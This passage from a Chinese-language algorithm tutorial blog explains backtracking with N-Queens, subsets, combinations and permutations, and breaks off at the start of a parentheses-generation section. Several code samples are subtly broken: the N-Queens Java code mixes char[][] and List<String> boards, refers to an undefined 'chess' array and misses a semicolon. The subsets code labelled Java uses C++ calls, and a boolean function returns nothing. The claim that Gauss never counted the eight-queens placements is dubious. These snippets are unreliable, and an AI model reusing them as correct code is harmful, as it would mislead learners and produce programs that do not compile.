/></p><p>至此，我们就通过全排列问题详解了回溯算法的底层原理。当然，这个算法解决全排列不是很高效，应为对链表使用 <code>contains</code> 方法需要 O(N) 的时间复杂度。有更好的方法通过交换元素达到目的，但是难理解一些，这里就不写了，有兴趣可以自行搜索一下。</p><p>但是必须说明的是，不管怎么优化，都符合回溯框架，而且时间复杂度都不可能低于 O(N!)，因为穷举整棵决策树是无法避免的。<strong>这也是回溯算法的一个特点，不像动态规划存在重叠子问题可以优化，回溯算法就是纯暴力穷举，复杂度一般都很高</strong>。</p><p>明白了全排列问题，就可以直接套回溯算法框架了，下面简单看看 N 皇后问题。</p><h2 id="1-2-N-皇后问题"><a href="#1-2-N-皇后问题" class="headerlink" title="1.2 N 皇后问题"></a>1.2 N 皇后问题</h2><p>这个问题很经典了，简单解释一下：给你一个 N×N 的棋盘，让你放置 N 个皇后，使得它们不能互相攻击。</p><p>PS：皇后可以攻击同一行、同一列、左上左下右上右下四个方向    的任意单位。</p><p>这个问题本质上跟全排列问题差不多，决策树的每一层表示棋盘上的每一行；每个节点可以做出的选择是，在该行的任意一列放置一个皇后。</p><p>直接套用框架:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">List&lt;List&lt;String&gt;&gt; res;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 输入棋盘边长 n，返回所有合法的放置 */</span></span><br><span class="line"><span class="keyword">public</span> List&lt;List&lt;String&gt;&gt; solveNQueens(<span class="keyword">int</span> n) &#123;</span><br><span class="line">    <span class="keyword">char</span>[][] board = <span class="keyword">new</span> <span class="keyword">char</span>[n][n];</span><br><span class="line">    <span class="comment">// &#x27;.&#x27; 表示空，&#x27;Q&#x27; 表示皇后，初始化空棋盘。</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; n; j++)</span><br><span class="line">            board[i][j] = <span class="string">&#x27;.&#x27;</span>;</span><br><span class="line">    List&lt;List&lt;String&gt;&gt; res = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">    backtrack(board, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 路径：board 中小于 row 的那些行都已经成功放置了皇后</span></span><br><span class="line"><span class="comment">// 选择列表：第 row 行的所有列都是放置皇后的选择</span></span><br><span class="line"><span class="comment">// 结束条件：row 超过 board 的最后一行</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">backtrack</span><span class="params">(List&lt;String&gt; board, <span class="keyword">int</span> row)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 触发结束条件</span></span><br><span class="line">    <span class="keyword">if</span> (row == board.length()) &#123;</span><br><span class="line">res.add(construct(board));</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> col = <span class="number">0</span>; col &lt; board.length(); col++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (valid(board, row, col)) &#123;</span><br><span class="line">            <span class="comment">//做选择</span></span><br><span class="line">            chess[row][col] = <span class="string">&#x27;Q&#x27;</span>;</span><br><span class="line">            <span class="comment">//进去下一决策</span></span><br><span class="line">        backtrack(board, row + <span class="number">1</span>);</span><br><span class="line">            <span class="comment">// 撤销选择</span></span><br><span class="line">            board[row][col] = <span class="string">&#x27;.&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这部分主要代码，其实跟全排列问题差不多，<code>isValid</code> 函数的实现也很简单：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//row表示第几行，col表示第几列</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">boolean</span> <span class="title">valid</span><span class="params">(<span class="keyword">char</span>[][] board, <span class="keyword">int</span> row, <span class="keyword">int</span> col)</span> </span>&#123;</span><br><span class="line">    <span class="comment">//判断当前列有没有皇后,因为他是一行一行往下走的，</span></span><br><span class="line">    <span class="comment">//我们只需要检查走过的行数即可，通俗一点就是判断当前</span></span><br><span class="line">    <span class="comment">//坐标位置的上面有没有皇后</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 检查列是否有皇后互相冲突</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; row; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (board[i][col] == <span class="string">&#x27;Q&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">// 检查右上方是否有皇后互相冲突</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = row - <span class="number">1</span>, j = col + <span class="number">1</span>; i &gt;= <span class="number">0</span> &amp;&amp; j &lt; board.length; i--, j++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (board[i][j] == <span class="string">&#x27;Q&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">// 检查左上方是否有皇后互相冲突</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = row - <span class="number">1</span>, j = col - <span class="number">1</span>; i &gt;= <span class="number">0</span> &amp;&amp; j &gt;= <span class="number">0</span>; i--, j--) &#123;</span><br><span class="line">        <span class="keyword">if</span> (board[i][j] == <span class="string">&#x27;Q&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>函数 <code>backtrack</code> 依然像个在决策树上游走的指针，通过 <code>row</code> 和 <code>col</code> 就可以表示函数遍历到的位置，通过 <code>isValid</code> 函数可以将不符合条件的情况剪枝：</p><p><img src="http://hexo-bolg-image.oss-cn-beijing.aliyuncs.com/img/回溯7.jpg" alt="img" style="zoom:50%;" /></p><p>如果直接给你这么一大段解法代码，可能是懵逼的。但是现在明白了回溯算法的框架套路，还有啥难理解的呢？无非是改改做选择的方式，排除不合法选择的方式而已，只要框架存于心，你面对的只剩下小问题了。</p><p>当 <code>N = 8</code> 时，就是八皇后问题，数学大佬高斯穷尽一生都没有数清楚八皇后问题到底有几种可能的放置方法，但是我们的算法只需要一秒就可以算出来所有可能的结果。</p><p>不过真的不怪高斯。这个问题的复杂度确实非常高，看看我们的决策树，虽然有 <code>isValid</code> 函数剪枝，但是最坏时间复杂度仍然是 O(N^(N+1))，而且无法优化。如果 <code>N = 10</code> 的时候，计算就已经很耗时了。</p><p><strong>有的时候，我们并不想得到所有合法的答案，只想要一个答案，怎么办呢</strong>？比如解数独的算法，找所有解法复杂度太高，只要找到一种解法就可以。</p><p>其实特别简单，只要稍微修改一下回溯算法的代码即可：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 函数找到一个答案后就返回 true</span></span><br><span class="line"><span class="function"><span class="keyword">boolean</span> <span class="title">backtrack</span><span class="params">(List&lt;String&gt; board, <span class="keyword">int</span> row)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 触发结束条件</span></span><br><span class="line">    <span class="keyword">if</span> (row == board.length()) &#123;</span><br><span class="line">res.add(construct(board));</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> col = <span class="number">0</span>; col &lt; n; col++) &#123;</span><br><span class="line">        ...</span><br><span class="line">        board[row][col] = <span class="string">&#x27;Q&#x27;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (backtrack(board, row + <span class="number">1</span>))</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line"></span><br><span class="line">        board[row][col] = <span class="string">&#x27;.&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样修改后，只要找到一个答案，for 循环的后续递归穷举都会被阻断。也许你可以在 N 皇后问题的代码框架上，稍加修改，写一个解数独的算法？</p><h2 id="1-3-最后总结"><a href="#1-3-最后总结" class="headerlink" title="1.3 最后总结"></a>1.3 最后总结</h2><p>回溯算法就是个多叉树的遍历问题，关键就是在前序遍历和后序遍历的位置做一些操作，算法框架如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">backtrack</span><span class="params">(路径, 选择列表)</span></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(选择：选择列表)&#123;</span><br><span class="line">        做选择</span><br><span class="line">        backtrack(路径, 选择列表)</span><br><span class="line">        撤销选择</span><br><span class="line">    &#125;   </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>写 <code>backtrack</code> 函数时，需要维护走过的「路径」和当前可以做的「选择列表」，当触发「结束条件」时，将「路径」记入结果集</strong>。</p><p>其实想想看，回溯算法和动态规划是不是有点像呢？我们在动态规划系列文章中多次强调，动态规划的三个需要明确的点就是「状态」「选择」和「base case」，是不是就对应着走过的「路径」，当前的「选择列表」和「结束条件」？</p><p>某种程度上说，动态规划的暴力求解阶段就是回溯算法。只是有的问题具有重叠子问题性质，可以用 dp table 或者备忘录优化，将递归树大幅剪枝，这就变成了动态规划。而今天的两个问题，都没有重叠子问题，也就是回溯算法问题了，复杂度非常高是不可避免的。</p><h1 id="2-回溯解决子集，排列，组合问题"><a href="#2-回溯解决子集，排列，组合问题" class="headerlink" title="2. 回溯解决子集，排列，组合问题"></a>2. 回溯解决子集，排列，组合问题</h1><p>今天就来聊三道考察频率高，而且容易让人搞混的算法问题，分别是求子集（subset），求排列（permutation），求组合（combination）。这几个问题都可以用回溯算法解决。</p><h2 id="2-1-子集"><a href="#2-1-子集" class="headerlink" title="2.1 子集"></a>2.1 子集</h2><p>问题很简单，输入一个<strong>不包含重复数字</strong>的数组，要求算法输出这些数字的所有子集。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">List&lt;List&lt;Integer&gt;&gt; subsets(List&lt;Integer&gt; nums);</span><br></pre></td></tr></table></figure><p>比如输入 <code>nums = [1,2,3]</code>，你的算法应输出 8 个子集，包含空集和本身，顺序可以不同：</p><p>[ [],[1],[2],[3],[1,3],[2,3],[1,2],[1,2,3] ]</p><p><strong>第一个解法是利用数学归纳的思想</strong>：假设我现在知道了规模更小的子问题的结果，如何推导出当前问题的结果呢？</p><p>具体来说就是，现在让你求 <code>[1,2,3]</code> 的子集，如果你知道了 <code>[1,2]</code> 的子集，是否可以推导出 <code>[1,2,3]</code> 的子集呢？先把  <code>[1,2]</code> 的子集写出来瞅瞅：</p><p>[ [],[1],[2],[1,2] ]</p><p>你会发现这样一个规律：</p><p>subset(<code>[1,2,3]</code>) - subset(<code>[1,2]</code>)= [3],[1,3],[2,3],[1,2,3]</p><p>而这个结果，就是把 sebset(<code>[1,2]</code>) 的结果中每个集合再添加上 3。</p><p>换句话说，如果 <code>A = subset([1,2])</code> ，那么：</p><p>subset(<code>[1,2,3]</code>)= A + [A[i].add(3) for i = 1..len(A)]</p><p>这就是一个典型的递归结构嘛，<code>[1,2,3]</code> 的子集可以由 <code>[1,2]</code> 追加得出，<code>[1,2]</code> 的子集可以由 <code>[1]</code> 追加得出，base case 显然就是当输入集合为空集时，输出子集也就是一个空集。</p><p>翻译成代码就很容易理解了：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">List&lt;List&lt;Integer&gt;&gt; subsets(List&lt;Integer&gt; nums); &#123;</span><br><span class="line">    <span class="comment">// base case，返回一个空集</span></span><br><span class="line">    <span class="keyword">if</span> (nums.isEmpty()) <span class="keyword">return</span> &#123;&#123;&#125;&#125;;</span><br><span class="line">    <span class="comment">// 把最后一个元素拿出来</span></span><br><span class="line">    <span class="keyword">int</span> n = nums.back();</span><br><span class="line">    nums.pop_back();</span><br><span class="line">    <span class="comment">// 先递归算出前面元素的所有子集</span></span><br><span class="line">    List&lt;List&lt;Integer&gt;&gt; res = subsets(nums);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> size = res.size();</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; size; i++) &#123;</span><br><span class="line">        <span class="comment">// 然后在之前的结果之上追加</span></span><br><span class="line">        res.push_back(res[i]);</span><br><span class="line">        res.back().push_back(n);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>这个问题的时间复杂度计算比较容易坑人</strong>。我们之前说的计算递归算法时间复杂度的方法，是找到递归深度，然后乘以每次递归中迭代的次数。对于这个问题，递归深度显然是 N，但我们发现每次递归 for 循环的迭代次数取决于 <code>res</code> 的长度，并不是固定的。</p><p>根据刚才的思路，<code>res</code> 的长度应该是每次递归都翻倍，所以说总的迭代次数应该是 2^N。或者不用这么麻烦，你想想一个大小为 N 的集合的子集总共有几个？2^N 个对吧，所以说至少要对 <code>res</code> 添加 2^N 次元素。</p><p>那么算法的时间复杂度就是 O(2^N) 吗？还是不对，2^N 个子集是 <code>push_back</code>添加进 <code>res</code> 的，所以要考虑 <code>push_back</code> 这个操作的效率：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">List&lt;List&lt;Integer&gt;&gt; res = ...</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; size; i++) &#123;</span><br><span class="line">    res.push_back(res[i]); <span class="comment">// O(N)</span></span><br><span class="line">    res.back().push_back(n); <span class="comment">// O(1)</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因为 <code>res[i]</code> 也是一个数组呀，<code>push_back</code> 是把 <code>res[i]</code> copy 一份然后添加到数组的最后，所以一次操作的时间是 O(N)。</p><p>综上，总的时间复杂度就是 O(N*2^N)，还是比较耗时的。</p><p>空间复杂度的话，如果不计算储存返回结果所用的空间的，只需要 O(N) 的递归堆栈空间。如果计算 <code>res</code> 所需的空间，应该是 O(N*2^N)。</p><p><strong>第二种通用方法就是回溯算法</strong>。旧文「回溯算法详解」写过回溯算法的模板：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">backtrack</span><span class="params">(路径, 选择列表)</span></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(选择：选择列表)&#123;</span><br><span class="line">        做选择</span><br><span class="line">        backtrack(路径, 选择列表)</span><br><span class="line">        撤销选择</span><br><span class="line">    &#125;   </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>只要改造回溯算法的模板就行了：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">List&lt;List&lt;Integer&gt;&gt; res = <span class="keyword">new</span> LinkedList&lt;&gt;();</span><br><span class="line"></span><br><span class="line">List&lt;List&lt;Integer&gt;&gt; subsets(<span class="keyword">int</span>[] nums) &#123;</span><br><span class="line">    <span class="comment">// 记录走过的路径</span></span><br><span class="line">    LinkedList&lt;Integer&gt; track = <span class="keyword">new</span> LinkedList&lt;&gt;();</span><br><span class="line">    backtrack(nums, <span class="number">0</span>, track);</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">backtrack</span><span class="params">(<span class="keyword">int</span>[] nums, <span class="keyword">int</span> start, LinkedList&lt;Integer&gt; track)</span> </span>&#123;</span><br><span class="line">    res.add(<span class="keyword">new</span> LinkedList(track));</span><br><span class="line">    <span class="comment">// 注意 i 从 start 开始递增</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = start; i &lt; nums.length(); i++) &#123;</span><br><span class="line">        <span class="comment">// 做选择</span></span><br><span class="line">        track.add(nums[i]);</span><br><span class="line">        <span class="comment">// 回溯</span></span><br><span class="line">        backtrack(nums, i + <span class="number">1</span>, track);</span><br><span class="line">        <span class="comment">// 撤销选择</span></span><br><span class="line">        track.removeLast();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看见，对 <code>res</code> 的更新是一个<strong>前序遍历</strong>，也就是说，<code>res</code> 就是树上的所有节点：</p><p><img src="F:\QQPCmgr\Desktop\回溯子集.jpg" alt="图片" style="zoom:50%;" /></p><h2 id="2-2-组合"><a href="#2-2-组合" class="headerlink" title="2.2 组合"></a>2.2 组合</h2><p>输入两个数字 <code>n, k</code>，算法输出 <code>[1..n]</code> 中 k 个数字的所有组合。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt; combine(<span class="keyword">int</span> n, <span class="keyword">int</span> k);</span><br></pre></td></tr></table></figure><p>比如输入 <code>n = 4, k = 2</code>，输出如下结果，顺序无所谓，但是不能包含重复（按照组合的定义，<code>[1,2]</code> 和 <code>[2,1]</code> 也算重复）：</p><p>[<br> [1,2],<br> [1,3],<br> [1,4],<br> [2,3],<br> [2,4],<br> [3,4]<br>]</p><p>这就是典型的回溯算法，<code>k</code> 限制了树的高度，<code>n</code> 限制了树的宽度，直接套我们以前讲过的回溯算法模板框架就行了：</p><p><img src="https://mmbiz.qpic.cn/sz_mmbiz_jpg/gibkIz0MVqdH2utsM2MG2UwDrfnfibkic701mPiaqZwiamztNdfCwz2oicLgxOfvsAF5lIXPDFOvo4cxvDPfRVf5ETxg/640?wx_fmt=jpeg&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt="图片" style="zoom:50%;" /></p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">vector</span>&lt;<span class="keyword">vector</span>&lt;<span class="keyword">int</span>&gt;&gt;res;</span><br><span class="line"></span><br><span class="line"><span class="keyword">vector</span>&lt;<span class="keyword">vector</span>&lt;<span class="keyword">int</span>&gt;&gt; combine(<span class="keyword">int</span> n, <span class="keyword">int</span> k) &#123;</span><br><span class="line">    <span class="keyword">if</span> (k &lt;= <span class="number">0</span> || n &lt;= <span class="number">0</span>) <span class="keyword">return</span> res;</span><br><span class="line">    <span class="keyword">vector</span>&lt;<span class="keyword">int</span>&gt; <span class="keyword">track</span>;</span><br><span class="line">    backtrack(n, k, <span class="number">1</span>, <span class="keyword">track</span>);</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void backtrack(<span class="keyword">int</span> n, <span class="keyword">int</span> k, <span class="keyword">int</span> start, <span class="keyword">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; <span class="keyword">track</span>) &#123;</span><br><span class="line">    <span class="comment">// 到达树的底部</span></span><br><span class="line">    <span class="keyword">if</span> (k == <span class="keyword">track</span>.<span class="keyword">size</span>()) &#123;</span><br><span class="line">        res.push_back(<span class="keyword">track</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 注意 i 从 start 开始递增</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = start; i &lt;= n; i++) &#123;</span><br><span class="line">        <span class="comment">// 做选择</span></span><br><span class="line">        <span class="keyword">track</span>.push_back(i);</span><br><span class="line">        backtrack(n, k, i + <span class="number">1</span>, <span class="keyword">track</span>);</span><br><span class="line">        <span class="comment">// 撤销选择</span></span><br><span class="line">        <span class="keyword">track</span>.pop_back();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>backtrack</code> 函数和计算子集的差不多，<strong>区别在于，更新 <code>res</code> 的地方是树的底端</strong>。</p><h2 id="2-3-排列"><a href="#2-3-排列" class="headerlink" title="2.3 排列"></a>2.3 排列</h2><p>输入一个不包含重复数字的数组 <code>nums</code>，返回这些数字的全部排列。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">List&lt;List&lt;Integer&gt;&gt; permute(<span class="keyword">int</span>[] nums);</span><br></pre></td></tr></table></figure><p>比如说输入数组 <code>[1,2,3]</code>，输出结果应该如下，顺序无所谓，不能有重复：</p><p>[<br> [1,2,3],<br> [1,3,2],<br> [2,1,3],<br> [2,3,1],<br> [3,1,2],<br> [3,2,1]<br>]</p><p><a href="http://mp.weixin.qq.com/s?__biz=MzAxODQxMDM0Mw==&amp;mid=2247484709&amp;idx=1&amp;sn=1c24a5c41a5a255000532e83f38f2ce4&amp;chksm=9bd7fb2daca0723be888b30345e2c5e64649fc31a00b05c27a0843f349e2dd9363338d0dac61&amp;scene=21#wechat_redirect">回溯算法详解</a> 中就是拿这个问题来解释回溯模板的。这里又列出这个问题，是将「排列」和「组合」这两个回溯算法的代码拿出来对比。</p><p>首先画出回溯树来看一看：</p><p><img src="http://hexo-bolg-image.oss-cn-beijing.aliyuncs.com/img/回溯树.jpg" alt="图片" style="zoom:50%;" /></p><p>我们当时使用 Java 代码写的解法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">List&lt;List&lt;Integer&gt;&gt; res = <span class="keyword">new</span> LinkedList&lt;&gt;();</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 主函数，输入一组不重复的数字，返回它们的全排列 */</span></span><br><span class="line">List&lt;List&lt;Integer&gt;&gt; permute(<span class="keyword">int</span>[] nums) &#123;</span><br><span class="line">    <span class="comment">// 记录「路径」</span></span><br><span class="line">    LinkedList&lt;Integer&gt; track = <span class="keyword">new</span> LinkedList&lt;&gt;();</span><br><span class="line">    backtrack(nums, track);</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">backtrack</span><span class="params">(<span class="keyword">int</span>[] nums, LinkedList&lt;Integer&gt; track)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 触发结束条件</span></span><br><span class="line">    <span class="keyword">if</span> (track.size() == nums.length) &#123;</span><br><span class="line">        res.add(<span class="keyword">new</span> LinkedList(track));</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; nums.length; i++) &#123;</span><br><span class="line">        <span class="comment">// 排除不合法的选择</span></span><br><span class="line">        <span class="keyword">if</span> (track.contains(nums[i]))</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        <span class="comment">// 做选择</span></span><br><span class="line">        track.add(nums[i]);</span><br><span class="line">        <span class="comment">// 进入下一层决策树</span></span><br><span class="line">        backtrack(nums, track);</span><br><span class="line">        <span class="comment">// 取消选择</span></span><br><span class="line">        track.removeLast();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>回溯模板依然没有变，但是根据排列问题和组合问题画出的树来看，排列问题的树比较对称，而组合问题的树越靠右节点越少。</p><p>在代码中的体现就是，排列问题每次通过 <code>contains</code> 方法来排除在 <code>track</code> 中已经选择过的数字；而组合问题通过传入一个 <code>start</code> 参数，来排除 <code>start</code> 索引之前的数字。</p><p><strong>以上，就是排列组合和子集三个问题的解法，总结一下</strong>：</p><p>子集问题可以利用数学归纳思想，假设已知一个规模较小的问题的结果，思考如何推导出原问题的结果。也可以用回溯算法，要用 <code>start</code> 参数排除已选择的数字。</p><p>组合问题利用的是回溯思想，结果可以表示成树结构，我们只要套用回溯算法模板即可，关键点在于要用一个 <code>start</code> 排除已经选择过的数字。</p><p>排列问题是回溯思想，也可以表示成树结构套用算法模板，不同之处在于使用<code>contains</code> 方法排除已经选择的数字，前文有详细分析，这里主要是和组合问题作对比。</p><p>对于这三个问题，关键区别在于回溯树的结构，不妨多观察递归树的结构，很自然就可以理解代码的含义了。</p><h1 id="3-括号生成"><a href="#3-括号生成" class="headerlink" title="3. 括号生成"></a>3. 括号生成</h1><p>括号问题可以简单分成两类，一类是前文写过的 <a href="https://labuladong.gitee.io/algo/高频面试系列/合法括号判定.html">括号的合法性判断</a> ，一类是合法括号的生成。对于括号合法性的判断，主要是借助「栈」这种数据结构，而对于括号的生成，一般都要利用回溯递归的思想。</p><p>关于回溯算法，我们前文写过一篇 <a href="https://labuladong.gitee.io/algo/算法思维系列/回溯算法详解修订版.html">回溯算法套路框架详解</a> 反响非常好，读本文前应该读过那篇文章，这样你就能够进一步了解回溯算法的框架使用方法了。</p><p>回到正题，括号生成算法是 LeetCode 第 22 